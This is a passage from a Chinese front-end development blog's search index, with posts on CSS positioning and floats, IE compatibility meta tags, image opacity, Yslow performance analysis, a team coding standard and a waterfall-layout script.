的父元素来进行定位。元素在页面不占据 位置。 可以使用 top right bottom left 移动元素位置。fixed绝对定位，相对于浏览器窗口来进行定位。其余和 absolute 一样，相当于一种特殊的absolute。inherit从父元素继承 position 属性的值。每个网页都可以看成是由一层一层页面堆叠起来的，如下图所示。position 设置为relative的时候，元素依然在普通流中，位置是正常位置，你可以通过 left right等移动元素。会影响其他元素的位置。而当一个元素的 position 值为 absolute 或 fixed 的时候，会发生三件事：把该元素往 Z 轴方向移了一层，元素脱离了普通流，所以不再占据原来那层的空间，还会覆盖下层的元素。该元素将变为块级元素，相当于给该元素设置了 display: block;（给一个内联元素，如 ，设置 absolute 之后发现它可以设置宽高了）。如果该元素是块级元素，元素的宽度由原来的 width: 100%（占据一行），变为了auto（width由内容决定）。由此观之，当 position 设置为 absolute 或 fixed，就没必要设置 display 为 block了。而且如果你不想覆盖下层的元素，可以设置 z-index 值 达到效果。floatfloat 顾名思义，就是把元素浮动，它的取值一共有四个：left right none inherit，光看名字就懂了，无需多言。最初的 float 只是用来实现文字环绕图片的效果，仅此而已。而现在 float 的应用已不止这个，前辈们也是写了无数博文来深入浅出的讲解它。从本质上讲解了float的原理。我就不班门弄斧写原理了，只说说 float 的几个要点就行了：只有左右浮动，没有上下浮动。元素设置 float 之后，它会脱离普通流（和 position: absolute; 一样），不再占据原来那层的空间，还会覆盖下一层的元素。浮动不会对该元素的上一个兄弟元素有任何影响。浮动之后，该元素的下一个兄弟元素会紧贴到该元素之前没有设置 float 的元素之后（很好理解，因为该元素脱离普通流了，或者说不在这一层了，所以它的下一个元素当然要补上它的位置）。如果该元素的下一个兄弟元素中有内联元素（通常是文字），则会围绕该元素显示，形成类似「文字围绕图片」的效果。这个我还是实践了一下的，点这个看看吧。下一个兄弟元素如果也设置了同一方向的 float，则会紧随该元素之后显示。该元素将变为块级元素，相当于给该元素设置了 display: block;（和position: absolute; 一样）。这里还有个东西，就是广为人知的——清除浮动。具体的方法五花八门，我就不多说了。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css解析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML+CSS：让IE渲染方式默认为最高]]></title>
    <url>%2F2015%2F07%2F12%2Fhtmlcss%EF%BC%9A%E8%AE%A9ie%E6%B8%B2%E6%9F%93%E6%96%B9%E5%BC%8F%E9%BB%98%E8%AE%A4%E4%B8%BA%E6%9C%80%E9%AB%98%2F</url>
    <content type="text"><![CDATA[现在有很多人的IE浏览器都升级到IE9以上了，所以这个时候就有又很多诡异的事情发生了，例如现在是IE9的浏览器，但是浏览器的文档模式却是IE8:为了防止这种情况，我们需要下面这段代码来让IE的文档模式永远都是最新的：http-equiv="X-UA-Compatible" content="IE=edge">```1234也可以用下面的写法：```&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge,chrome=1&quot;&gt;这段代码和上面相比后面加了一个chrome=1，这个Google Chrome Frame（谷歌内嵌浏览器框架GCF），如果有的用户电脑里面装了这个chrome的插件，就可以让电脑里面的IE不管是哪个版本的都可以使用Webkit引擎及V8引擎进行排版及运算，无比给力，不过如果用户没装这个插件，那这段代码就会让IE以最高的文档模式展现效果。附带：让IE8，ie9兼容 css3 media 媒体查询的js1234&lt;!--[if lt IE 9]&gt;&lt;script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"&gt;&lt;/script&gt;&lt;script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>IE渲染</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[未知高度的图片垂直居中]]></title>
    <url>%2F2015%2F07%2F12%2F%E6%9C%AA%E7%9F%A5%E9%AB%98%E5%BA%A6%E7%9A%84%E5%9B%BE%E7%89%87%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;title&gt;未知高度的图片垂直居中&lt;/title&gt;&lt;style type="text/css"&gt;*&#123; margin:0; padding:0;&#125;#box&#123;width:500px;height:400px;text-align:center;border:1px solid #d3d3d3;background:#fff;display: table;*display:block;*font-size:349px; // 字体大小约为容器高度的0.873倍 400*0.873 = 349*font-family:Arial; // 防止非utf-8引起的hack失效问题，如gbk编码&#125;#box span&#123;display: table-cell; vertical-align:middle;&#125;#box img&#123;*vertical-align:middle;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="box"&gt;&lt;span&gt;&lt;img src="http://www.xxx.com/resource/images/extend/logo/logo_hd.png" width="420" height="300" alt="" /&gt;&lt;/span&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>图片居中</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html+css操作技巧]]></title>
    <url>%2F2015%2F07%2F12%2Fhtmlcss%E6%93%8D%E4%BD%9C%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[1. 文字强制不换行,多余部分用省略号代替1white-space:nowrap;text-overflow:ellipsis;overflow:hidden;2. 火狐，123```cssresize:none; 或者 min-width:;max-width:;min-height:;max-height:;3. 火狐，&lt;label&gt;放入多个input, text需要多次点击才可以打字，radio则无法实现单选改用&lt;p&gt;&lt;/p&gt;标记书写4. &lt;a&gt;标记去除虚线框1a&#123;outline:none;blr:expression(this.onFocus=this.blur());&#125;5. &lt;img&gt;下方出现5px空白1img&#123;display:block;&#125;6. banner图片满屏居中显示&lt;img &gt;div {position:relative;overflow:hidden;height:200px;text-align:center;}div img{position:absolute;left:50%;top:0;margin-left:-1250px;}(注意：margin-left:所得到的值是img的尺寸除以2。)7. 背景透明1filter:alpha(opacity=80);opacity:0.8;8. 火狐里,&lt;label&gt;放入多个input,text则需要多次点击才可以打字，若为radio则无法实现单选改用&lt;p&gt;标记书写9. &lt;p&gt;&lt;/p&gt;可在网页上直接更改内容,规定是否允许用户编辑内容Contenteditable=“true”10.input失去焦点文字消失1&lt;input type="text" value="请输入用户名" class="in_serch" /&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>css技巧</tag>
        <tag>html技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS 图像透明度]]></title>
    <url>%2F2015%2F07%2F12%2Fcss-%E5%9B%BE%E5%83%8F%E9%80%8F%E6%98%8E%E5%BA%A6%2F</url>
    <content type="text"><![CDATA[定义透明效果的 CSS3 属性是 opacity1234567.transparent_class &#123;filter:alpha(opacity=50);-moz-opacity:0.5;-khtml-opacity: 0.5;opacity: 0.5; &#125;opacity: 0.5; 这是最重要的，因为它是CSS标准.该属性支持Firefox, Safari和 Opera.filter:alpha(opacity=50); 这个是为IE6设的，可取值在0-100，其它三个0到1.-moz-opacity:0.5; 这个是为了支持一些老版本的Mozilla浏览器。-khtml-opacity: 0.5; 这个为了支持一些老版本的Safari浏览器。123456img&#123;opacity:0.4;filter:alpha(opacity=40);hover:img&#123;opacity:0.4;filter:alpha(opacity=40);/* 针对 IE8 以及更早的版本 */img:hover&#123;opacity:1.0;filter:alpha(opacity=100)&#125;;对应的 CSS 是：opacity=1。IE8 以及更早的浏览器：filter:alpha(opacity=100)。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>图像透明</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[div宽度自适应问题]]></title>
    <url>%2F2015%2F07%2F12%2Fdiv%E5%AE%BD%E5%BA%A6%E8%87%AA%E9%80%82%E5%BA%94%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1.宽度自适应的条件 自适应宽度的层不要指定宽度和float属性 自适应宽度的层物理的位置放在最下面自适应的div中不能出现“width=100%”，否则在ie6中会出现错位现象，ie7，ie8，ff3，chrome都正常。2.div的默认（不写）宽度是100%，但不撑大父框架，写出width=100%是如果再使用了margin或padding就会将父框架撑大。table默认宽度为内容的长度，与div不同，因此最好不要混着用，否者这个宽度自适应的方法在ie6下就有问题了。但高版本的浏览器都没问题。如果父框架设定了固定宽度，那么子div的宽度设为width=100%，即使设定了margin,padding或border都不会撑大父框架。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>宽度自适应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站性能工具Yslow的使用方法]]></title>
    <url>%2F2015%2F07%2F12%2F%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E5%B7%A5%E5%85%B7yslow%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;Yslow是雅虎开发的基于网页性能分析浏览器插件，从年初我使用了YSlow后，改变了博客模板大量冗余代码，不仅提升了网页的打开速度，这款插件还帮助我分析了不少其他网站的代码，之前我还特意写了提高网站速度的秘籍，就是通过这款插件分析得出的。网络上已经有不少Yslow使用说明了，本文我想介绍下我使用Yslow的方法和一些别人没提到的小技巧。Yslow的安装方法&emsp;&emsp;现在Yslow已经有很多版本了，本文介绍的是3.0.4最新版，打开Yslow官网就能看到有四个版本可供选择：火狐（firefox）浏览器、谷歌（chrome）浏览器、欧朋（opera）浏览器和移动版。安装Yslow要先安装Firebug（本地址以火狐为例），两种方法启动Yslow：1、打开Firebug窗口，选择Yslow选项。2、直接点击火狐右下角的Yslow启动按钮。Yslow的启动界面&emsp;&emsp;点 击 Run Test 运行Yslow，也可以点击 Grade, Components, 或Statistics选项开始对页面的分析，如果在 Autorun YSlow each time a web page is loaded 上打上对勾，它将自动对以后打开页面进行分。注意图中的红框，这里是规则集，YSlow（V2）包含了所有22个测试的规则，YSlow（V1）包含原始13规则，小网站或博客-这个规则集包含14个规则，适用于小型网站或博客，建议对号入座&emsp;&emsp;雅虎评估网站性能的23条军规雅虎曾经针对网站速度提出了非常著名34条准则：《Best Practices for Speeding Up Your Web Site》。而现在将34条精简为更加直观的23条，并针对每一条给出从F~A的评分以及最终的总分,而现在23条网站性能优化建议在YSlow的官网首页就能看到，当然也可以不看，在使用Yslow后，在控制面板里就会给你评分提示，和改进建议。Grade(等级视图)—Yslow的第二个选项卡YslowGrade(等级视图)给出的网站性能评分（图2：Yslow给出的网站性能评分）&emsp;&emsp;Yslow给出的网站性能评分，从F~A，A是最好的，通过测试卢松松博客来看，网站有4处得分最低，例如图2中的最低分提示：我博客的HTTP请求太多。其中应用了14个外部JS、3个CSS文件（之前我已从6个合并为3个）、14个CSS背景图片。&emsp;&emsp;Yslow的建议是让我合并这些，至于合并CSS引用图片我在“提高网站打开速度的7大秘籍”中介绍过。Components（组件视图）—Yslow的第三个选项卡通过Components考验查看网页各个元素占用的空间大小（图3：通过Components考验查看网页各个元素占用的空间大小）&emsp;&emsp;通 过Components考验查看网页各个元素占用的空间大小，例如我博客某个页面，有236个images（图片），占用了489.2K，通过详细查看， 发现来自gravatar（评论头像）的引用图片非常大，在加上我博客本省评论量就打，每个头像就占用几K，几百个就占用了整个网页50%的大小，而且图片还是引用的，加载就更慢。所以，我得出的结论是：gravatar虽然增强了互动性和个性，但也结结实实影响了网站速度。Statistics（统计信息视图）—Yslow的第四个选项卡Yslow的统计信息视图（图4：Yslow的统计信息视图)&emsp;&emsp;左 侧图表显示是页面元素在空缓存的加载情况，右侧为页面元素使用缓存后的页面加载情况。从图中可以直观的看出（尤其是我标的红框），这个网页263个&emsp;&emsp;HTTP请求，网页的大小达到773.9K，意味着打开没打开一个页面几乎需要下载1M的东西，而通过使用缓存后我们可以看到效果图片基本靠缓存，而网页 的总大小压缩到43.2K。&emsp;&emsp;Statistics这个统计信息视图工具和Components（第三选项卡）一样，只是效果更直观，如果要获得性能优化建议还是要看Grade（第二选项卡）的详细建议。Tools（辅助工具）—Yslow的第五个选项卡Yslow提供的小工具（图5：Yslow提供的小工具）&emsp;&emsp;JSLint是一个强大的工具，它可以检验HTML代码以及内联的Javascript代码，通过JSLint发现了google analytics上的一个js错误。ALL JS：查看你这个网页上一共引用了多少JS。All JS Beautified：把所有JS放在打开的页面中，利用站长统一检查（我感觉作用不大）。All JS Minified：同上，但它显示的是压缩过的js代码，如果你要JS优化，它已经给你优化好了，来过来直接用。All CSS：显示你网页所有CSS文件。YUI CSS Compressor：显示网页压缩后的CSS文件，也是拿过来可以直接用的。All Smush.it™：图片在线优化网站，点击它后会自动跳到smushit网站上给你自动优化CSS图片，该网站提供了优化前与优化后的对比，点击直接下载优化后的图片，在覆盖到自己网站上就可以了，强烈推荐。Printable View：这个是打印用的，部门开会、前端设计师讨论、向老板汇报时估计用的上。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>前端性能</tag>
        <tag>Yslow使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web前端开发规范文档]]></title>
    <url>%2F2015%2F07%2F12%2Fweb%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3%2F</url>
    <content type="text"><![CDATA[规范目的为提高团队协作效率,便于后台人员添加功能及前端后期优化维护,输出高质量的文档, 特制订此文档.本规范文档一经确认,前端开发人员必须按本文档规范进行前台页面开发.本文档如有不对或者不合适的地方请及时提出,经讨论决定后方可更改.基本准则符合web标准, 语义化html, 结构表现行为分离,兼容性优良. 页面性能方面,代码要求简洁明了有序, 尽可能的减小服务器负载,保证最快的解析速度.文件规范1. html, css, js, images文件均归档至&lt;系统开发规范&gt;约定的目录中;2. html文件命名: 英文命名, 后缀.htm. 同时将对应界面稿放于同目录中, 若界面稿命名为中文, 请重命名与html文件同名, 以方便后端添加功能时查找对应页面;3. css文件命名: 英文命名, 后缀.css. 共用base.css, 首页index.css, 其他页面依实际模块需求命名.;4. Js文件命名: 英文命名, 后缀.js. 共用common.js, 其他依实际模块需求命名.html书写规范1. 文档类型声明及编码: 统一为html5声明类型&lt;!DOCTYPE html&gt;; 编码统一为&lt;meta charset=&quot;gbk&quot; /&gt;, 书写时利用IDE实现层次分明的缩进;2. 非特殊情况下样式文件必须外链至&lt;head&gt;...&lt;/head&gt;之间;非特殊情况下JavaScript文件必须外链至页面底部;3. 引入样式文件或JavaScript文件时, 须略去默认类型声明, 写法如下:123&lt;link rel="stylesheet" href="..." /&gt;&lt;style&gt;...&lt;/style&gt;&lt;script src="..."&gt;&lt;/script&gt;4. 引入JS库文件, 文件名须包含库名称及版本号及是否为压缩版, 比如jquery-1.4.1.min.js; 引入插件, 文件名格式为库名称+插件名称, 比如jQuery.cookie.js;5. 所有编码均遵循xhtml标准, 标签 &amp; 属性 &amp; 属性命名 必须由小写字母及下划线数字组成, 且所有标签必须闭合, 包括 br (&lt;br /&gt;), hr(&lt;hr /&gt;)等; 属性值必须用双引号包括;6. 充分利用无兼容性问题的html自身标签, 比如span, em, strong, optgroup, label,等等; 需要为html元素添加自定义属性的时候, 首先要考虑下有没有默认的已有的合适标签去设置, 如果没有, 可以使用须以”data-“为前缀来添加自定义属性，避免使用”data:”等其他命名方式;7. 语义化html, 如 标题根据重要性用h*(同一页面只能有一个h1), 段落标记用p, 列表用ul, 内联元素中不可嵌套块级元素;8. 尽可能减少div嵌套, 如&lt;div class=&quot;box&quot;&gt;&lt;div class=&quot;welcome&quot;&gt;欢迎访问XXX, 您的用户名是&lt;div class=&quot;name&quot;&gt;用户名&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;完全可以用以下代码替代: &lt;div class=&quot;box&quot;&gt;&lt;p&gt;欢迎访问XXX, 您的用户名是&lt;span&gt;用户名&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;;9. 书写链接地址时, 必须避免重定向，例如：href=”http://grycheng.com/“, 即须在URL地址后面加上“/”；10. 在页面中尽量避免使用style属性,即style=”…”;11. 必须为含有描述性表单元素(input, textarea)添加label, 如&lt;p&gt;姓名: &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot; /&gt;&lt;/p&gt;须写成:&lt;p&gt;&lt;label for=&quot;name&quot;&gt;姓名: &lt;/label&gt;&lt;input type=&quot;text&quot; id=&quot;name&quot; /&gt;&lt;/p&gt;12. 能以背景形式呈现的图片, 尽量写入css样式中;13. 重要图片必须加上alt属性; 给重要的元素和截断的元素加上title;14. 给区块代码及重要功能(比如循环)加上注释, 方便后台添加功能;15. 特殊符号使用: 尽可能使用代码替代: 比如 &lt;(&lt;) &amp; &gt;(&gt;) &amp; 空格( ) &amp; »(») 等等;16. 书写页面过程中, 请考虑向后扩展性;17. class &amp; id 参见 css书写规范.css书写规范1. 编码统一为utf-8;2. 协作开发及分工: i会根据各个模块, 同时根据页面相似程序, 事先写好大体框架文件, 分配给前端人员实现内部结构&amp;表现&amp;行为; 共用css文件base.css由i书写, 协作开发过程中, 每个页面请务必都要引入, 此文件包含reset及头部底部样式, 此文件不可随意修改;3. class与id的使用: id是唯一的并是父级的, class是可以重复的并是子级的, 所以id仅使用在大的模块上, class可用在重复使用率高及子级中; id原则上都是由我分发框架文件时命名的, 为JavaScript预留钩子的除外;4. 为JavaScript预留钩子的命名, 请以 js_ 起始, 比如: js_hide, js_show;5. class与id命名: 大的框架命名比如header/footer/wrapper/left/right之类的在2中由i统一命名.其他样式名称由 小写英文 &amp; 数字 &amp; _ 来组合命名, 如i_comment, fontred, width200; 避免使用中文拼音, 尽量使用简易的单词组合; 总之, 命名要语义化, 简明化.6. 规避class与id命名(此条重要, 若有不明白请及时与i沟通):a） 通过从属写法规避, 示例见d;b）取父级元素id/class命名部分命名, 示例见d;c）重复使用率高的命名, 请以自己代号加下划线起始, 比如i_clear;d）a,b两条, 适用于在2中已建好框架的页面, 如, 要在2中已建好框架的页面代码&lt;div id=&quot;mainnav&quot;&gt;&lt;/div&gt;中加入新的div元素,按a命名法则: &lt;div id=&quot;mainnav&quot;&gt;&lt;div class=&quot;firstnav&quot;&gt;...&lt;/div&gt;&lt;/div&gt;,样式写法: #mainnav .firstnav{…….}按b命名法则: &lt;div id=&quot;mainnav&quot;&gt;&lt;div class=&quot;main_firstnav&quot;&gt;...&lt;/div&gt;&lt;/div&gt;,样式写法: .main_firstnav{…….}7. css属性书写顺序, 建议遵循: 布局定位属性–&gt;自身属性–&gt;文本属性–&gt;其他属性. 此条可根据自身习惯书写, 但尽量保证同类属性写在一起. 属性列举: 布局定位属性主要包括: display &amp; list-style &amp; position（相应的 top,right,bottom,left） ＆ float &amp; clear ＆ visibility ＆ overflow； 自身属性主要包括: width &amp; height &amp; margin &amp; padding &amp; border &amp; background; 文本属性主要包括：color &amp; font &amp; text-decoration &amp; text-align &amp; vertical-align &amp; white- space &amp; 其他 &amp; content; 我所列出的这些属性只是最常用到的, 并不代表全部;8. 书写代码前, 考虑并提高样式重复使用率;9. 充分利用html自身属性及样式继承原理减少代码量, 比如:&lt;ul class=&quot;list&quot;&gt;&lt;li&gt;这儿是标题列表&lt;span&gt;2010-09- 15&lt;/span&gt;&lt;/ul&gt;定义ul.list li{position:relative} ul.list li span{position:absolute; right:0}即可实现日期居右显示10. 样式表中中文字体名, 请务必转码成unicode码, 以避免编码错误时乱码;11. 背景图片请尽可能使用sprite技术, 减小http请求, 考虑到多人协作开发, sprite按模块制作;12. 使用table标签时(尽量避免使用table标签), 请不要用width/ height/cellspacing/cellpadding等table属性直接定义表现, 应尽可能的利用table自身私有属性分离结构与表现 , 如thead,tr,th,td,tbody,tfoot,colgroup,scope; (cellspaing及cellpadding的css控制方法:table{border:0;margin:0;border-collapse:collapse;} table th, table td{padding:0;}, base.css文件中我会初始化表格样式)13. 杜绝使用&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=7&quot; /&gt; 兼容 ie8;14. 用png图片做图片时, 要求图片格式为png-8格式,若png-8实在影响图片质量或其中有半透明效果, 请为ie6单独定义背景:_background:none;_filter:progid:DXImageTransform.Microsoft.AlphaImageLoader (sizingMethod=crop, src=’img/bg.png’);15. 避免兼容性属性的使用, 比如text-shadow || css3的相关属性;16. 减少使用影响性能的属性, 比如position:absolute || float ;17. 必须为大区块样式添加注释, 小区块适量注释;18. 代码缩进与格式: 建议单行书写, 可根据自身习惯, 后期优化i会统一处理;JavaScript书写规范1. 文件编码统一为utf-8, 书写过程过, 每行代码结束必须有分号; 原则上所有功能均根据XXX项目需求原生开发, 以避免网上down下来的代码造成的代码污染(沉冗代码 || 与现有代码冲突 || …);2. 库引入: 原则上仅引入jQuery库, 若需引入第三方库, 须与团队其他人员讨论决定;3. 变量命名: 驼峰式命名. 原生JavaScript变量要求是纯英文字母, 首字母须小写, 如iTaoLun;jQuery变量要求首字符为’_’, 其他与原生JavaScript 规则相同, 如: _iTaoLun;另, 要求变量集中声明, 避免全局变量.4. 类命名: 首字母大写, 驼峰式命名. 如 ITaoLun;5. 函数命名: 首字母小写驼峰式命名. 如iTaoLun();6. 命名语义化, 尽可能利用英文单词或其缩写;7. 尽量避免使用存在兼容性及消耗资源的方法或属性, 比如eval_r() &amp; innerText;8. 后期优化中, JavaScript非注释类中文字符须转换成unicode编码使用, 以避免编码错误时乱码显示;9. 代码结构明了, 加适量注释. 提高函数重用率;10. 注重与html分离, 减小reflow, 注重性能.图片规范1. 所有页面元素类图片均放入img文件夹, 测试用图片放于img/demoimg文件夹;2. 图片格式仅限于gif || png || jpg;3. 命名全部用小写英文字母 || 数字 || _ 的组合，其中不得包含汉字 || 空格 || 特殊字符；尽量用易懂的词汇, 便于团队其他成员理解; 另, 命名分头尾两部分, 用下划线隔开, 比如ad_left01.gif || btn_submit.gif;4. 在保证视觉效果的情况下选择最小的图片格式与图片质量, 以减少加载时间;5. 尽量避免使用半透明的png图片(若使用, 请参考css规范相关说明);6. 运用css sprite技术集中小的背景图或图标, 减小页面http请求, 但注意, 请务必在对应的sprite psd源图中划参考线, 并保存至img目录下.注释规范1. html注释: 注释格式 , ‘–’只能在注释的始末位置,不可置入注释文字区域;2. css注释: 注释格式 ;3. JavaScript注释, 单行注释使用’//这儿是单行注释’ ,多行注释使用 ;开发及测试工具约定建议使用Aptana || Dw || Vim , 亦可根据自己喜好选择, 但须遵循如下原则:1. 不可利用IDE的视图模式’画’代码;2. 不可利用IDE生成相关功能代码, 比如Dw内置的一些功能js;3. 编码必须格式化, 比如缩进;测试工具: 前期开发仅测试FireFox &amp; IE6 &amp; IE7 &amp; IE8 , 后期优化时加入Opera &amp; Chrome &amp; Safari;建议测试顺序:FireFox–&gt;IE7–&gt;IE8–&gt;IE6–&gt;Opera–&gt;Chrome–&gt;Safari, 建议安装firebug及IE Tab Plus插件.##其他规范1. 开发过程中严格按分工完成页面, 以提高css复用率, 避免重复开发;2. 减小沉冗代码, 书写所有人都可以看的懂的代码. 简洁易懂是一种美德. 为用户着想, 为服务器着想.]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>前端规范</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[瀑布流布局实例]]></title>
    <url>%2F2015%2F07%2F12%2F%E7%80%91%E5%B8%83%E6%B5%81%E5%B8%83%E5%B1%80%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html;charset=UTF-8" /&gt;&lt;title&gt;&lt;/title&gt;&lt;style&gt;* &#123;padding:0;margin:0;&#125;/*好孩子别用这个*/html &#123;height:100%;&#125;body &#123;height:100%;&#125;img &#123;border:0;&#125;div.wrap &#123;width:100%;margin:0 auto;overflow:hidden;position:relative;background:#DDD;&#125;div.wrap div &#123;width:220px;padding:4px;border:1px solid #000;float:left;&#125;div.wrap div h3 &#123;line-height:35px;&#125;div.wrap div img &#123;width:220px;&#125;div.wrap div p &#123;padding:5px;line-height:20px;&#125;div.wrap div span &#123;color:#F00;&#125;&lt;/style&gt;&lt;script&gt;window.onload = function() &#123;waterFall("wrap")&#125;//window.onresize = function() &#123;waterFall("wrap")&#125;function waterFall(element,space,children) &#123;if(!element) return ;space = space || 20 ;children = children || "div" ; //前三行默认设置，分别为外框元素id，上下留白，子元素标签名(子元素标签名使用太多或出错)var wrap = document.getElementById(element) ;var water = wrap.getElementsByTagName(children) ;var spaceWidth = water[0].offsetWidth ; //获取子元素宽度(offsetWidth会获取块级元素的padding和border)var wrapWidth = wrap.offsetWidth ; //获取外框元素宽度var colNum = Math.floor(wrapWidth/spaceWidth) ; //计算获取外框元素所能承受列数var padding = Math.floor((wrapWidth - colNum*spaceWidth)/(colNum+1)) ; //计算外框元素剩余宽度并计算左右留白var column = new Array() ;var length = water.length ;var maxHeight = 0 ;for(var i=0;i&lt;colNum;i++) &#123; //初始化数组来计算各列初始top值和left值column[i] = new Array() ;column[i].top = space ;column[i].left = (spaceWidth * i)+padding*(i+1) ; //计算各列距离左侧距离&#125;for(var i=0;i&lt;length;i++) &#123; //遍历所有子元素及瀑布流布局var index = i+1 ; //计算该子元素属于第几列if(index%colNum==0) &#123;sub = colNum ;&#125; else &#123;sub = index%colNum ;&#125;_this = water ;_this[i].style.position = "absolute" ;_this[i].style.top = column[sub-1].top + "px" ;_this[i].style.left = column[sub-1].left + "px" ;column[sub-1].top += _this[i].offsetHeight + space ; //计算各列最新高度以便赋值&#125;for(var i=0;i&lt;colNum;i++) &#123; //获取瀑布流整体布局高度if(column[i].top &gt; maxHeight) maxHeight = column[i].top ;&#125;wrap.style.height = maxHeight+"px" ; //给外框元素赋值以防止出现子元素溢出外框元素&#125;//希望能帮助到大家哈，我一开始使用的事Jquery，但是考虑瀑布流比较消耗浏览器内存，就改成原生javascript了，滚动到浏览器底部ajax取值做瀑布流也灭做，等到项目到了再说吧&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="wrap" id="wrap"&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" /&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" /&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" /&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" /&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" /&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" /&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" /&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" /&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" 